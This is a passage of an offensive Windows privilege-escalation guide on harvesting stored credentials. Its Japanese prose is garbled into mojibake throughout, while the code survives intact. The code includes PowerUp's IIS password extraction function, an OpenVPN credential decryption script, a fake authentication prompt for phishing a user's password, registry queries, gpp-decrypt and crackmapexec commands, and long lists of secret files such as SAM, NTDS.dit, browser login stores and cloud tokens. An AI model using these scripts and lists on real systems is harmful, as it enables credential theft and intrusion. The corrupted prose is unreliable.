äººã€…ã¯ã—ã°ã—ã°Windowsãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã§StickyNotesã‚¢ãƒ—ãƒªã‚’ä½¿ç”¨ã—ã¦ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„ãã®ä»–ã®æƒ…å ±ã‚’ä¿å­˜ã—ã¾ã™ãŒã€ã“ã‚ŒãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ã§ã‚ã‚‹ã“ã¨ã«æ°—ã¥ã„ã¦ã„ã¾ã›ã‚“ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`ã«ã‚ã‚Šã€å¸¸ã«æ¤œç´¢ã—ã¦èª¿æŸ»ã™ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚

### AppCmd.exe

**AppCmd.exeã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å›å¾©ã™ã‚‹ã«ã¯ã€ç®¡ç†è€…ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€é«˜ã„æ•´åˆæ€§ãƒ¬ãƒ™ãƒ«ã§å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**\
**AppCmd.exe**ã¯`%systemroot%\system32\inetsrv\`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚Šã¾ã™ã€‚\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€ã„ãã¤ã‹ã®**è³‡æ ¼æƒ…å ±**ãŒæ§‹æˆã•ã‚Œã¦ãŠã‚Šã€**å›å¾©**ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)ã‹ã‚‰æŠ½å‡ºã•ã‚Œã¾ã—ãŸã€‚
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚\
ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ãƒ¼ã¯ **SYSTEM æ¨©é™ã§å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚å¤šãã¯ **DLL Sideloading ã«è„†å¼±** ã§ã‚ã‚‹ï¼ˆæƒ…å ±ã¯ [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc) ã‹ã‚‰å–å¾—ï¼‰ã€‚
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ¬ã‚¸ã‚¹ãƒˆãƒªï¼ˆè³‡æ ¼æƒ…å ±ï¼‰

### Puttyã®è³‡æ ¼æƒ…å ±
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ãƒ›ã‚¹ãƒˆã‚­ãƒ¼
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…ã®SSHã‚­ãƒ¼

SSHã®ç§˜å¯†ã‚­ãƒ¼ã¯ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ `HKCU\Software\OpenSSH\Agent\Keys` å†…ã«ä¿å­˜ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ãã“ã«èˆˆå‘³æ·±ã„æƒ…å ±ãŒãªã„ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
ã‚‚ã—ãã®ãƒ‘ã‚¹å†…ã«ã‚¨ãƒ³ãƒˆãƒªãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€ãŠãã‚‰ãä¿å­˜ã•ã‚ŒãŸSSHã‚­ãƒ¼ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã‚Œã¯æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ãŒã€[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) ã‚’ä½¿ç”¨ã—ã¦ç°¡å˜ã«å¾©å·åŒ–ã§ãã¾ã™ã€‚\
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«é–¢ã™ã‚‹è©³ç´°ã¯ã“ã¡ã‚‰ï¼š[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` ã‚µãƒ¼ãƒ“ã‚¹ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ãªã„å ´åˆã€è‡ªå‹•çš„ã«èµ·å‹•ã™ã‚‹ã‚ˆã†ã«ã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã‚‚ã¯ã‚„æœ‰åŠ¹ã§ã¯ãªã„ã‚ˆã†ã§ã™ã€‚`ssh-add`ã‚’ä½¿ç”¨ã—ã¦sshã‚­ãƒ¼ã‚’ä½œæˆã—ã€ãã‚Œã‚‰ã‚’è¿½åŠ ã—ã€sshçµŒç”±ã§ãƒã‚·ãƒ³ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã‚ˆã†ã¨ã—ã¾ã—ãŸã€‚ãƒ¬ã‚¸ã‚¹ãƒˆãƒª`HKCU\Software\OpenSSH\Agent\Keys`ã¯å­˜åœ¨ã›ãšã€procmonã¯éå¯¾ç§°ã‚­ãƒ¼èªè¨¼ä¸­ã«`dpapi.dll`ã®ä½¿ç”¨ã‚’ç‰¹å®šã—ã¾ã›ã‚“ã§ã—ãŸã€‚
{% endhint %}

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
ã‚ãªãŸã¯**metasploit**ã‚’ä½¿ç”¨ã—ã¦ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™: _post/windows/gather/enum\_unattend_

ä¾‹ã®å†…å®¹:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### ã‚¯ãƒ©ã‚¦ãƒ‰è³‡æ ¼æƒ…å ±
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã—ã¾ã™

### ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸGPPãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰

ä»¥å‰åˆ©ç”¨å¯èƒ½ã ã£ãŸæ©Ÿèƒ½ã«ã‚ˆã‚Šã€Group Policy Preferences (GPP) ã‚’ä»‹ã—ã¦è¤‡æ•°ã®ãƒã‚·ãƒ³ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å±•é–‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ãŸã ã—ã€ã“ã®æ–¹æ³•ã«ã¯é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ¬ é™¥ãŒã‚ã‚Šã¾ã—ãŸã€‚ã¾ãšç¬¬ä¸€ã«ã€SYSVOLã«XMLãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦ä¿å­˜ã•ã‚Œã¦ã„ã‚‹Group Policy Objects (GPOs) ã«ã¯ã€ã©ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚‚ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã—ãŸã€‚ç¬¬äºŒã«ã€ã“ã‚Œã‚‰ã®GPPå†…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ã€å…¬ã«æ–‡æ›¸åŒ–ã•ã‚ŒãŸãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦AES256ã§æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã—ãŸãŒã€èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚ã‚Œã°èª°ã§ã‚‚å¾©å·åŒ–ã§ãã¾ã—ãŸã€‚ã“ã‚Œã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ˜‡æ ¼æ¨©ã‚’å–å¾—ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ·±åˆ»ãªãƒªã‚¹ã‚¯ã‚’ã‚‚ãŸã‚‰ã—ã¾ã—ãŸã€‚

ã“ã®ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ãŸã‚ã«ã€"cpassword" ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒç©ºã§ãªã„ãƒ­ãƒ¼ã‚«ãƒ«ã«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸGPPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹æ©Ÿèƒ½ãŒé–‹ç™ºã•ã‚Œã¾ã—ãŸã€‚ãã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã¨ã€ãã®æ©Ÿèƒ½ã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¾©å·åŒ–ã—ã¦ã‚«ã‚¹ã‚¿ãƒ PowerShellã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’è¿”ã—ã¾ã™ã€‚ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€GPPã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€ã«é–¢ã™ã‚‹è©³ç´°ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ã“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã®ç‰¹å®šã¨ä¿®å¾©ã‚’æ”¯æ´ã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã—ã¾ã™ï¼š`C:\ProgramData\Microsoft\Group Policy\history` ã¾ãŸã¯ _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vistaä»¥å‰)_ 

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPasswordã‚’å¾©å·åŒ–ã™ã‚‹ã«ã¯:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
`crackmapexec`ã‚’ä½¿ç”¨ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹æ–¹æ³•:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

### IIS ã‚¦ã‚§ãƒ–æ§‹æˆ
```powershell
Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem â€“Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Web.configã®ä¾‹ã¨è³‡æ ¼æƒ…å ±ï¼š
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNã®è³‡æ ¼æƒ…å ±
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ãƒ­ã‚°
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem â€“Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### è³‡æ ¼æƒ…å ±ã®è¦æ±‚

å¸¸ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**è‡ªåˆ†ã®è³‡æ ¼æƒ…å ±ã‚’å…¥åŠ›ã—ã¦ã‚‚ã‚‰ã†ã‹ã€åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’å…¥åŠ›ã—ã¦ã‚‚ã‚‰ã†ã‚ˆã†ã«è¦æ±‚**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«**è³‡æ ¼æƒ…å ±**ã‚’ç›´æ¥**è¦æ±‚**ã™ã‚‹ã“ã¨ã¯éå¸¸ã«**ãƒªã‚¹ã‚­ãƒ¼**ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼‰:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **è³‡æ ¼æƒ…å ±ã‚’å«ã‚€å¯èƒ½æ€§ã®ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«å**

ä»¥å‰ã«**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚’**ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆ**ã¾ãŸã¯**Base64**ã§å«ã‚“ã§ã„ãŸã¨çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
ã™ã¹ã¦ã®ææ¡ˆã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã—ã¾ã™:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem â€“Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBinå†…ã®è³‡æ ¼æƒ…å ±

Binã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ä¸­ã«ã‚ã‚‹è³‡æ ¼æƒ…å ±ã‚’æ¢ã™ã¹ãã§ã™

è¤‡æ•°ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ä¿å­˜ã•ã‚ŒãŸ**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å›å¾©**ã™ã‚‹ã«ã¯ã€æ¬¡ã‚’ä½¿ç”¨ã§ãã¾ã™: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…éƒ¨

**è³‡æ ¼æƒ…å ±ã‚’æŒã¤å¯èƒ½æ€§ã®ã‚ã‚‹ä»–ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‹ã‚‰opensshã‚­ãƒ¼ã‚’æŠ½å‡ºã—ã¾ã™ã€‚**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ãƒ–ãƒ©ã‚¦ã‚¶ã®å±¥æ­´

**Chromeã¾ãŸã¯Firefox** ã‹ã‚‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹dbsã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ãƒ–ãƒ©ã‚¦ã‚¶ã®å±¥æ­´ã€ãƒ–ãƒƒã‚¯ãƒãƒ¼ã‚¯ã€ãŠæ°—ã«å…¥ã‚Šã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ãã“ã«**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒ**ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLLã®ä¸Šæ›¸ã**

**Component Object Model (COM)** ã¯ã€Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ å†…ã«çµ„ã¿è¾¼ã¾ã‚ŒãŸæŠ€è¡“ã§ã‚ã‚Šã€ç•°ãªã‚‹è¨€èªã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆé–“ã®**ç›¸äº’é€šä¿¡**ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚å„COMã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã‚¯ãƒ©ã‚¹IDï¼ˆCLSIDï¼‰ã«ã‚ˆã£ã¦è­˜åˆ¥ã•ã‚Œã€å„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯1ã¤ä»¥ä¸Šã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä»‹ã—ã¦æ©Ÿèƒ½ã‚’å…¬é–‹ã—ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹IDï¼ˆIIDï¼‰ã«ã‚ˆã£ã¦è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚

COMã‚¯ãƒ©ã‚¹ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¯ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…ã®**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**ãŠã‚ˆã³**HKEY\_**_**CLASSES\_**_**ROOT\Interface**ã«å®šç¾©ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã¯ã€**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**ã‚’ãƒãƒ¼ã‚¸ã—ã¦ä½œæˆã•ã‚Œã¾ã™ã€‚

ã“ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®CLSIDsã®ä¸­ã«ã¯ã€**InProcServer32**ã¨ã„ã†å­ãƒ¬ã‚¸ã‚¹ãƒˆãƒªãŒã‚ã‚Šã€**DLL**ã‚’æŒ‡ã™**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤**ã¨ã€**Apartment**ï¼ˆã‚·ãƒ³ã‚°ãƒ«ã‚¹ãƒ¬ãƒƒãƒ‰ï¼‰ã€**Free**ï¼ˆãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ï¼‰ã€**Both**ï¼ˆã‚·ãƒ³ã‚°ãƒ«ã¾ãŸã¯ãƒãƒ«ãƒï¼‰ã€ã¾ãŸã¯**Neutral**ï¼ˆã‚¹ãƒ¬ãƒƒãƒ‰ãƒ‹ãƒ¥ãƒ¼ãƒˆãƒ©ãƒ«ï¼‰ã¨å‘¼ã°ã‚Œã‚‹å€¤ã‚’å«ã‚€**ThreadingModel**ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

åŸºæœ¬çš„ã«ã€å®Ÿè¡Œã•ã‚Œã‚‹DLLã®ã„ãšã‚Œã‹ã‚’**ä¸Šæ›¸ã**ã§ãã‚Œã°ã€åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹å ´åˆã«ã¯ã€ç‰¹æ¨©ã‚’**æ˜‡æ ¼**ã§ãã¾ã™ã€‚

